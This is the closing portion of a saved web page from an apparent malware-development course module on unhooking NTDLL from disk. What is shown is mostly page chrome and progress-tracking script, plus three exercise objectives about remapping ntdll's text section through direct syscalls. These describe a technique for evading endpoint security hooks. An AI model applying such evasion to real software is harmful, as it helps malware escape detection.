<p><img src="NTDLL%20Unhooking%20-%20From%20Disk_files/ntdll-unhooking-disk-new-6.png" alt="A5"></p>

            </div></div>
            <div id="accessory-container" class="hidden flex flex-col w-1/4 min-w-1/4 h-full">
                <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-1/2">
                    <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                        
                                                                        
            <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Reimplement the 'MapNtdllFromDisk' function using direct syscalls</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Use the Optional Header to retrieve the NTDLL's text section base address and size</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-2" data-objective-id="2" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Reimplement the 'ReplaceNtdllTxtSection' function to use direct syscalls</label>
                            </div>
                                                                                  
                </div>
                <div id="ide" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-1/2">
                    <textarea class="bg-gray-900 outline-0 w-full h-full resize-none font-sans" placeholder="Write temporary notes or code here"></textarea>
                </div>
            </div>  
        </div>
      </div>
      <div class="flex">
        <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700 border-r border-l border-gray-600 pl-4 pt-2 pb-2 rounded-bl rounded-br">
                        <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules/83"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Previous</button></a>           
            </div>
                        <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Modules</button></a>           
            </div>
            <div class="my-2 mr-2">
            <form id="complete-module" action="https://maldevacademy.com/modules/84/complete" method="POST">
                <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">                <button id="complete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-green-700 rounded-lg focus:shadow-outline hover:bg-green-800 ">Complete</button>
            </form>
            <form id="uncomplete-module" action="https://maldevacademy.com/modules/84/progress" method="POST">
                <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">                <button id="uncomplete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-red-700 rounded-lg focus:shadow-outline hover:bg-red-800 hidden">Undo</button>
            </form>
            </div>
                                    <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules/85"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Next</button></a>           
            </div>
                    </div>
    </div>
</div>

<footer id="footer" class="text-gray-400 border-t-[1px] border-gray-700 bg-gray-900 body-font hidden">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4">Â© 2023 MalDev Academy</p>
        <a href="https://twitter.com/maldevacademy" target="_blank" class="text-gray-500 hover:text-white ml-2">
            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path d="M8.29 20.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0022 5.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.072 4.072 0 012.8 9.713v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 012 18.407a11.616 11.616 0 006.29 1.84"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
          Terms and Conditions
      </a></span><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
  </a></footer><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">        

        <script src="NTDLL%20Unhooking%20-%20From%20Disk_files/jquery-3.6.0.min.js"></script>
        <script src="NTDLL%20Unhooking%20-%20From%20Disk_files/bootstrap.min.js"></script>
        <link rel="preload" as="style" href="NTDLL%20Unhooking%20-%20From%20Disk_files/app.4474f4d1.css"><link rel="modulepreload" href="NTDLL%20Unhooking%20-%20From%20Disk_files/app.5f3af5ce.js"><link rel="stylesheet" href="NTDLL%20Unhooking%20-%20From%20Disk_files/app.4474f4d1.css"><script type="module" src="NTDLL%20Unhooking%20-%20From%20Disk_files/app.5f3af5ce.js"></script><script src="NTDLL%20Unhooking%20-%20From%20Disk_files/navbar.js"></script>
<script src="NTDLL%20Unhooking%20-%20From%20Disk_files/moduleviewer.js"></script>

 
<script>
$(document).ready(function() {
    $('a:not([data-target="_self"])').attr('target', '_blank');

    $('input[type=checkbox]').change(function() {
    var checked = $(this).is(':checked');
    var userId = 260;
    var moduleId = 84;
    var objectiveId = $(this).data('objective-id');
    $.ajax({
        url: checked ? "https://maldevacademy.com/complete/objective" : "https://maldevacademy.com/remove/objective",
        type: "POST",
        data: {
        _token: "YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost",
        user_id: userId,
        module_id: moduleId,
        objective_id: objectiveId
        },
        success: function(response) {

        },
        error: function(xhr) {
        console.log('Error');
        }
    });
    });

    $('#complete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = form.find('#complete-btn');
    var uncompleteBtn = $('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            completeBtn.addClass('hidden');
            uncompleteBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});

$('#uncomplete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = $('#complete-btn');
    var uncompleteBtn = form.find('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            uncompleteBtn.addClass('hidden');
            completeBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});
});
</script>
    
</a></body></html>